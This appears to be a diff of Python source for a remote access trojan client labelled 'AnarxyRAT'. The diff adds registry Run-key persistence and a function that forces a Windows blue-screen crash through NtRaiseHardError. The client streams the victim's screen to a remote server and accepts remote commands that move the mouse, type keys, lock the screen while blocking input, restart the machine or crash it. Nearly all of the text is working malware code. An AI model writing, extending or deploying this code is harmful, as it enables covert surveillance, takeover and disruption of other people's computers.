@@ -5,22 +5,22 @@ import numpy as np
 import pickle
 import struct
 import threading
-from pynput.mouse import Controller as MouseController, Button
-from pynput.keyboard import Controller as KeyboardController
-from pynput.keyboard import Key as PynKey
+import ctypes
+import os
+import subprocess
+import sys
 import tkinter as tk
 from PIL import Image, ImageTk
+from pynput.mouse import Controller as MouseController, Button
+from pynput.keyboard import Controller as KeyboardController, Key as PynKey
 import platform
-import ctypes
-import subprocess
-import os
 import requests
 from io import BytesIO
 
 try:
     import winreg
 except ImportError:
-    winreg = None  # Only works on Windows
+    winreg = None
 
 # === Setup ===
 server_ip = '192.168.1.248'
@@ -30,49 +30,31 @@ mouse = MouseController()
 keyboard = KeyboardController()
 
 keymap = {
-    "BACKSPACE": PynKey.backspace,
-    "ENTER": PynKey.enter,
-    "SPACE": PynKey.space,
-    "TAB": PynKey.tab,
-    "ESC": PynKey.esc,
-    "SHIFT": PynKey.shift,
-    "CTRL": PynKey.ctrl,
-    "ALT": PynKey.alt,
-    "CAPSLOCK": PynKey.caps_lock,
-    "DELETE": PynKey.delete,
-    "UP": PynKey.up,
-    "DOWN": PynKey.down,
-    "LEFT": PynKey.left,
-    "RIGHT": PynKey.right
+    "BACKSPACE": PynKey.backspace, "ENTER": PynKey.enter, "SPACE": PynKey.space,
+    "TAB": PynKey.tab, "ESC": PynKey.esc, "SHIFT": PynKey.shift, "CTRL": PynKey.ctrl,
+    "ALT": PynKey.alt, "CAPSLOCK": PynKey.caps_lock, "DELETE": PynKey.delete,
+    "UP": PynKey.up, "DOWN": PynKey.down, "LEFT": PynKey.left, "RIGHT": PynKey.right
 }
 
-# === Persistence Setup ===
-def add_to_startup():
+# === Persistence: Add rat.py to startup ===
+def add_startup_rat_py():
     if platform.system() == "Windows" and winreg:
         try:
-            exe_path = os.path.abspath(__file__)
-            appdata = os.getenv("APPDATA")
-            install_dir = os.path.join(appdata, "AnarxyClient")
-            os.makedirs(install_dir, exist_ok=True)
-            target_path = os.path.join(install_dir, "client.exe")
-
-            if not os.path.exists(target_path):
-                # Copy to target location
-                import shutil
-                shutil.copy2(exe_path, target_path)
-
+            username = os.getlogin()
+            download_path = os.path.join("C:\\Users", username, "Downloads", "rat.py")
+            command = f'pythonw.exe "{download_path}"'
             key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Run",
                                  0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(key, "AnarxyClient", 0, winreg.REG_SZ, target_path)
+            winreg.SetValueEx(key, "AnarxyRAT", 0, winreg.REG_SZ, command)
             winreg.CloseKey(key)
+            print("[+] Added to startup successfully.")
         except Exception as e:
-            print(f"[!] Startup reg error: {e}")
+            print(f"[!] Failed to add to startup: {e}")
 
-# Run persistence on startup
-add_to_startup()
+add_startup_rat_py()
 
-# === Lock Screen Setup (same as before) ===
+# === Lock Screen ===
 lock_root = None
 lock_overlays = []
 lock_img_tk = None
@@ -114,7 +96,6 @@ def show_lock_screen_gui():
 
         canvas = tk.Canvas(win, bg="black", highlightthickness=0)
         canvas.pack(fill="both", expand=True)
-
         canvas.create_text(mon["width"] // 2, int(mon["height"] * 0.25),
                            text="Screen locked by anarxy", fill="white", font=("Arial", 48))
 
@@ -124,20 +105,34 @@ def show_lock_screen_gui():
         lock_overlays.append(win)
 
     if platform.system() == "Windows":
-        try: ctypes.windll.user32.BlockInput(True)
-        except: pass
+        try:
+            ctypes.windll.user32.BlockInput(True)
+        except:
+            pass
 
 def hide_lock_screen_gui():
     global lock_overlays
     for w in lock_overlays:
-        try: w.destroy()
-        except: pass
+        try:
+            w.destroy()
+        except:
+            pass
     lock_overlays.clear()
     if platform.system() == "Windows":
-        try: ctypes.windll.user32.BlockInput(False)
-        except: pass
+        try:
+            ctypes.windll.user32.BlockInput(False)
+        except:
+            pass
 
-# === Main RAT Loop ===
+# === Trigger BSOD ===
+def trigger_bsod():
+    try:
+        ctypes.windll.ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
+        ctypes.windll.ntdll.NtRaiseHardError(0xC000021A, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+    except Exception as e:
+        print(f"[!] BSOD failed: {e}")
+
+# === RAT Socket Loop ===
 s = socket.socket()
 s.connect((server_ip, server_port))
 
@@ -147,8 +142,8 @@ with mss.mss() as sct:
     height = monitor["height"]
 
     while True:
-        frame_np = np.array(sct.grab(monitor))
-        frame = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
+        frame = np.array(sct.grab(monitor))
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
         _, encimg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
         data = pickle.dumps((encimg, width, height))
         s.sendall(struct.pack(">L", len(data)) + data)
@@ -166,32 +161,26 @@ with mss.mss() as sct:
 
                 if parts[0] == "MOVE":
                     mouse.position = (int(parts[1]), int(parts[2]))
-
                 elif parts[0] == "CLICK":
                     mouse.click(Button.left if parts[1].upper() == "LEFT" else Button.right)
-
                 elif parts[0] == "SCROLL":
                     mouse.scroll(0, int(parts[1]))
-
+                elif parts[0] == "KEY":
+                    k = keymap.get(parts[1].upper(), parts[1].lower())
+                    keyboard.press(k)
+                    keyboard.release(k)
                 elif parts[0] == "XBUTTON":
                     if platform.system() == "Windows":
-                        xbtn = 0x0001 if parts[1] == "1" else 0x0002
-                        ctypes.windll.user32.mouse_event(0x0080, 0, 0, xbtn, 0)
-                        ctypes.windll.user32.mouse_event(0x0100, 0, 0, xbtn, 0)
-
-                elif parts[0] == "KEY":
-                    key = keymap.get(parts[1].upper(), parts[1].lower())
-                    keyboard.press(key)
-                    keyboard.release(key)
-
+                        btn = 0x0001 if parts[1] == "1" else 0x0002
+                        ctypes.windll.user32.mouse_event(0x0080, 0, 0, btn, 0)
+                        ctypes.windll.user32.mouse_event(0x0100, 0, 0, btn, 0)
                 elif parts[0] == "LOCKSCREEN" and lock_root:
                     lock_root.after(0, show_lock_screen_gui)
-
                 elif parts[0] == "UNLOCKSCREEN" and lock_root:
                     lock_root.after(0, hide_lock_screen_gui)
-
                 elif parts[0] == "RESTART":
                     subprocess.call("shutdown /r /t 0", shell=True)
-
+                elif parts[0] == "BSOD":
+                    trigger_bsod()
         except socket.timeout:
             continue
